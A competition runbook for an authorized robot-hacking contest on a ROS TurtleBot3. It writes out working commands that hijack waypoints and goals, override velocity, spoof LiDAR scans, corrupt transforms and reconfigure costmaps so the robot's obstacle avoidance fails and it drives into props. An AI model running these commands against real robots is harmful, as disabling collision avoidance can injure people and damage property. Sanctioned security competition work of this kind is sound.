# Phase 3 — Alter the Predefined Path (Criterion 3)

> **Competition-day command runbook. Not a report, not a claim of a scored result.**
> Nothing here has been demonstrated end-to-end on the physical robot — autonomous
> movement itself is still an open blocker (see
> `03-navigation-prerequisite-handoff.md`). Treat every attack below as *prepared
> and planned*, to be validated live and shown to a judge immediately when it works.
>
> **Scope / authorization:** Team's assigned competition robot in the organizers'
> arena only. Keep real people, hands and feet clear of the arena during any
> movement test. Keep a kill path ready at all times (teleop `s` + Ctrl+C, or
> `rostopic pub -1 /motor_power std_msgs/Bool "data: false"`).

---

## 0. What Criterion 3 rewards

| Sub-item | Goal | Points | Key physical fact |
|---|---|---:|---|
| 3.1 | Follow a **different** path, hit **nothing** | 10 | obstacle avoidance stays ON |
| 3.2 | Steer the path to **hit the human object** | 15 | human = **15 cm**, below the ~20 cm LiDAR plane → **invisible** to the sensor |
| 3.3 | Steer the path to **hit the excavator object** | 20 | excavator = **25 cm**, above the LiDAR plane → **visible** → avoidance must be defeated |

The rubric lists these as alternatives ("either one of the following"). **Confirm
with the judges whether they stack or only the highest counts**, then attempt the
highest-value item you can do *reliably*. 3.2 and 3.3 are strictly harder versions
of 3.1, so get 3.1 working first as your floor.

### Attack-vector / points note (read before choosing a method)

Criterion 8 note in the rubric: **physical attacks earn half points.** An attack
delivered **over Bob's wireless network** (you joined his Wi-Fi, you talk to the
ROS master / topics from your laptop) is a *network* vector (AV:N) → **full
points**. Driving the robot from a keyboard/monitor physically plugged into the
Pi, or a USB, is *physical* (AV:P) → **half points**. **Prefer the network path
for everything.** Use the physically-attached console only as a fallback and
expect the penalty.

---

## 1. How the mission consumes a path (why these attacks work)

From the organizer node `hack_my_robot.py`:

- Waypoints arrive on **`/addpose`** (`geometry_msgs/PoseWithCovarianceStamped`),
  are shown on **`/waypoints`** (`PoseArray`).
- Publishing **`/path_ready`** (`std_msgs/Empty`) runs the route once **and writes
  the waypoints to `saved_path/scan_positions.csv`**.
- Publishing **`/start_journey`** (`std_msgs/Empty`) **reloads that CSV** and loops
  the route.
- `FollowPath` sends each waypoint to **`move_base`**, which does the obstacle
  avoidance from the LiDAR **`/scan`** → costmap.

None of these topics/params are authenticated. So an attacker on the ROS graph can:

1. **Inject their own waypoints** on `/addpose` (then `/path_ready`), or
2. **Overwrite `scan_positions.csv`** (needs file access from Criterion 2) then
   `/start_journey`, or
3. **Hijack the live goal** on `/move_base_simple/goal`, or
4. **Bypass or blind the planner** (`/cmd_vel`, fake `/scan`, `/tf`, costmap
   clearing, dynamic reconfigure) — required only for 3.3.

Helper scripts for all of this are in [`scripts/`](scripts/). Every script takes
coordinates as arguments and prints what it will publish before doing it.

---

## 2. Preconditions (same for all of 3.x)

```bash
# On your laptop, joined to Bob's Wi-Fi, ROS sourced and pointed at the robot master:
source /opt/ros/noetic/setup.bash
unset ROS_HOSTNAME
export ROS_IP=<YOUR_LAPTOP_IP_ON_BOBS_WIFI>
export ROS_MASTER_URI=http://<ROBOT_IP>:11311   # confirm live; do NOT reuse 10.10.184.153 blindly
export TURTLEBOT3_MODEL=burger

# Prove you can see the mission graph:
rosnode list
rostopic info /addpose
rostopic info /waypoints
rostopic info /move_base/status
timeout -s INT -k 2 5 rostopic hz /scan     # LiDAR alive (~11 Hz)
```

**Record the arena coordinates first.** Open RViz (Section 6 of the nav handoff),
confirm localization, and read off, in the `map` frame:

- the predefined waypoints (baseline), and
- the `(x, y)` of the **human** prop and the **excavator** prop.

```bash
# Click a point in RViz 'Publish Point' and read it, or echo the clicked point:
timeout -s INT -k 2 20 rostopic echo /clicked_point
```

Write these into `scripts/arena_coords.example.env` (copy to `arena_coords.env`).
Do **not** commit the live competition coordinates to GitHub.

---

## 3. Criterion 3.1 — Different path, no collision (10 pts)

Goal: the robot visibly follows a route you chose, different from the predefined
one, and **avoids every object**. Leave obstacle avoidance untouched.

### Route A — inject waypoints over the network (preferred, AV:N)

```bash
# Establish a reproducible BASELINE first (record the official predefined route).
# Then send three DIFFERENT, clearly-clear waypoints:
python3 scripts/inject_waypoints.py \
  --addpose /addpose \
  --wp -0.5 0.8 0 \
  --wp  0.4 1.2 90 \
  --wp -0.3 -0.6 180
# the script publishes PoseWithCovarianceStamped on /addpose for each --wp (x y yaw_deg)

# Run the route once (also saves them to scan_positions.csv on the robot):
rostopic pub -1 /path_ready std_msgs/Empty
```

If the mission is **past** the GET_PATH collection window, use the saved-path
route instead:

### Route B — overwrite the saved path, then replay (needs file access, Criterion 2)

```bash
# With SSH/file access to the robot (from Criterion 1/2), back up then replace:
ssh ubuntu@<ROBOT_IP>
cp ~/catkin_ws/src/hack_my_robot*/saved_path/scan_positions.csv /tmp/scan_positions.bak.csv
# write your 3 lines: x,y,z,qx,qy,qz,qw  (use scripts/make_path_csv.py to generate)
# then, from your laptop:
rostopic pub /start_journey std_msgs/Empty      # reloads the CSV and loops
```

### Route C — live goal hijack (redirect a running route)

```bash
# Redirect the robot to a waypoint of your choosing while it drives:
rostopic pub -1 /move_base_simple/goal geometry_msgs/PoseStamped \
"header: {frame_id: 'map'}
pose:
  position: {x: -0.5, y: 0.8, z: 0.0}
  orientation: {z: 0.0, w: 1.0}"
```

**Evidence for 3.1:** baseline route recording + your changed waypoints + a video
of the robot following the new path and **not** touching any object + the method
used (which topic, from your laptop over Wi-Fi). Call a judge the moment it works.

---

## 4. Criterion 3.2 — Hit the human object (15 pts)

**The trick:** the human prop is **15 cm**, the LiDAR scans at **~20 cm**. The
sensor never sees it, so it is never in the costmap, so `move_base` plans straight
through its ground position **with avoidance still fully enabled**. You are not
defeating avoidance — the sensor is simply blind to that object.

```bash
# 1) Confirm the human is NOT in the LiDAR picture: in RViz, the human's floor
#    position shows NO laser return and NO costmap obstacle. (That is the whole point.)
# 2) Place a waypoint on the FAR side of the human prop, so the straight path
#    from the robot crosses the human's (x,y):
source scripts/arena_coords.env      # defines HUMAN_X, HUMAN_Y, and a point beyond it
python3 scripts/inject_waypoints.py --addpose /addpose \
  --wp "$BEYOND_HUMAN_X" "$BEYOND_HUMAN_Y" 0
rostopic pub -1 /path_ready std_msgs/Empty
```

Because the planner sees clear space, it will not swerve. Keep the leg short and
the speed default. **Stop immediately after contact** — you only need to
demonstrate the intentional hit, not repeatedly ram it.

> **Caveat (don't overclaim the physics).** Sensor height makes the hit *likely*,
> not *guaranteed*: the prop can still be caught by the inflation radius of nearby
> visible obstacles, by a reflective edge that returns a stray beam, or by the
> robot's own footprint padding. Treat the LiDAR blind spot as the mechanism, run
> it once to confirm, and only then call the judge — don't present it as a
> certainty before you've seen it happen.

**Why this is a legitimate criterion, not a crude bump:** the *point* being
demonstrated is a real sensor-coverage vulnerability — a short obstacle below the
scan plane is invisible to LiDAR-only avoidance. Say exactly that to the judge;
it is also good Criterion 6 (sophistication) and 7 (creativity) material.

**Evidence for 3.2:** RViz showing no obstacle at the human's location + the
waypoint you sent + video of the robot driving into the human prop on purpose +
the sensor-height explanation.

---

## 5. Criterion 3.3 — Hit the excavator object (20 pts)

The excavator is **25 cm > 20 cm**, so it **is** in the scan and costmap and
`move_base` will route around it. To hit it you must **defeat obstacle
avoidance**. Below, in rough order of sophistication (higher = better for
Criteria 6 and 7). Pick the one you can do reliably; keep speeds low and a kill
path ready.

### Method A — direct velocity override (bypass the planner), network (AV:N)

Publish `/cmd_vel` yourself at higher priority than / instead of the planner. The
excavator is irrelevant because nothing is doing avoidance.

```bash
# Open-loop nudge toward the excavator. SHORT bursts only; watch the robot.
python3 scripts/drive_cmd_vel.py --linear 0.08 --duration 2.0   # ~16 cm; re-run as needed
# stop:
python3 scripts/drive_cmd_vel.py --stop
```

Crude but reliable. Still **network**, so full points — the half-points penalty is
only for *physical* access, not for using a velocity topic over Wi-Fi.

### Method B — blind the LiDAR with a fake `/scan` (sensor spoofing)

Publish a forged `/scan` at the same rate showing **max range / clear** so the
excavator vanishes from the costmap, then send a goal beyond it; `move_base` plans
straight through.

```bash
# Spoof clear scans (this OUT-publishes the real driver on the same topic):
python3 scripts/fake_scan.py --mode clear --rate 11 &
# now a goal on the far side of the excavator:
rostopic pub -1 /move_base_simple/goal geometry_msgs/PoseStamped \
"header: {frame_id: 'map'}
pose: {position: {x: $BEYOND_EXCAV_X, y: $BEYOND_EXCAV_Y, z: 0.0}, orientation: {z: 0.0, w: 1.0}}"
# kill the spoofer the instant you are done:
kill %1
```

### Method C — corrupt `/tf` so the robot mis-locates the obstacle

Publish a competing `map→odom` (or `odom→base_footprint`) transform with an offset
so the planner believes the excavator is elsewhere and drives into the real one.

```bash
python3 scripts/tf_offset.py --parent map --child odom --dx 0.3 --dy 0.0   # small offset
```

### Method D — erase the obstacle faster than it's sensed (costmap clearing)

```bash
# Loop the clear service while commanding the goal through the excavator:
watch -n 0.3 'rosservice call /move_base/clear_costmaps "{}"'
```

### Method E — flatten the obstacle/inflation layers (dynamic reconfigure)

```bash
rosrun dynamic_reconfigure dynparam set /move_base/local_costmap/inflation_layer inflation_radius 0.0
rosrun dynamic_reconfigure dynparam set /move_base/global_costmap/obstacle_layer  max_obstacle_height 0.1
# a 0.1 m max height makes the 0.25 m excavator "too tall to count" -> dropped from the costmap
rostopic pub -1 /move_base_simple/goal geometry_msgs/PoseStamped "<goal beyond excavator>"
```

> Method E is the most "elegant" — you turn the robot's own safety parameter
> against it so the tall excavator is filtered out as noise. Good story for the
> judges and for Criterion 6/7.

**Evidence for 3.3:** before/after costmap in RViz (excavator present → gone, or
avoidance disabled) + the exact method/commands + video of the intentional
collision + a sentence stating it was intentional and network-delivered.

---

## 6. Do-not-overclaim audit

- Autonomous movement was **not** working as of the last session; 3.x cannot score
  until the nav prerequisite passes. Fix that first.
- A changed route, a blind-spot hit, and a defeated-avoidance hit are **three
  different** demonstrations — don't present one as another.
- Rubric rule 4: points only for **intentional** effects. If the robot hits an
  object due to a technical fault, it does not count — be ready to show the judge
  the command that caused it.
- Rule 5: **call a judge immediately** when an attack works and be ready to
  re-demonstrate.
- Keep the real competition coordinates, IPs and the arena map **out of the public
  GitHub repo**.

## 7. Evidence checklist

- [ ] Baseline predefined route recorded (waypoints + video)
- [ ] 3.1: changed waypoints + clear-run video + method/topic noted
- [ ] 3.2: RViz no-obstacle-at-human proof + waypoint + intentional-hit video + sensor-height explanation
- [ ] 3.3: avoidance-defeat proof (costmap/scan/tf before-after) + method + intentional-hit video
- [ ] Attack vector recorded as network vs physical (points implication)
- [ ] Judge notified and shown live
- [ ] Full GenAI prompt/answer history retained for submission
